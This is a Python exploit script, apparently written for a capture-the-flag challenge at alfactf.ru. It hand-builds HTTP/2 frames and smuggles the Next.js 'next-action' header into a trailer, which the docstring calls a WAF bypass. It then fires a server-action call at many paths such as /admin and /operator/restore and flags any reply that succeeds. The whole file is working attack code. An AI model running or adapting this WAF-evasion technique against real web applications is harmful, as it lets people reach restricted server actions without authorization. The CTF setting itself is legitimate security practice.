#!/usr/bin/env python3
"""
probe38: same trailer-WAF-bypass action call, but on different :path.
"""
import socket
import ssl
import struct
import time
import re
import json
import hashlib
from hpack import Encoder, Decoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def call_action(body_bytes, path="/", content_type="text/plain;charset=UTF-8"):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", path),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p38"),
    ]
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    sock.settimeout(15)
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    sock.close()

    body = b""
    pos = 0
    dec = Decoder()
    status = None
    while pos < len(buf):
        if len(buf) - pos < 9:
            break
        length = int.from_bytes(buf[pos:pos+3], "big")
        ftype = buf[pos+3]
        flags = buf[pos+4]
        sid_ = int.from_bytes(buf[pos+5:pos+9], "big") & 0x7fffffff
        payload = buf[pos+9:pos+9+length]
        pos += 9 + length
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, body


def extract_row1(body):
    text = body.decode("utf-8", "replace")
    m = re.search(r'^1:(\{.*?\})$', text, re.MULTILINE)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            return m.group(1)
    return None


PATHS = [
    "/",
    "/api/operator/dispatch",
    "/admin",
    "/admin/",
    "/?_rsc=1",
    "/_next/data/yEEwQolhm6qqnM1oNsx0J/index.json",
    "/_next/data/zcKIq23YpfwN4M1E0pxgp/index.json",
    "/restore",
    "/recovery",
    "/operator",
    "/operator/restore",
    "/operator/recovery",
    "/api",
    "/api/operator",
    "/api/operator/",
    "/index",
    "/index.html",
    "/?action=restore",
    "/?recovery=1",
    "/?authorized=1",
]

print(f"\n{'path':<60} status sha row1")
for path in PATHS:
    try:
        st, body = call_action(b'["$K1"]', path=path)
    except Exception as e:
        print(f"  {path:<60} ERR={e}")
        continue
    sha = hashlib.sha256(body).hexdigest()[:12]
    row1 = extract_row1(body)
    err = row1.get("error") if isinstance(row1, dict) else None
    msg = (row1.get("message", "") if isinstance(row1, dict) else "")[:50] if row1 else ""
    print(f"  {path:<60} st={st} sha={sha} err={err} msg={msg!r}")
    if row1 and isinstance(row1, dict) and err and err != "recovery-offline":
        print(f"    !!! UNUSUAL row1: {row1}")
    if row1 and isinstance(row1, dict) and row1.get("ok"):
        print(f"    !!!!! ok=true: {row1}")
    time.sleep(0.4)

print("\n# done.")
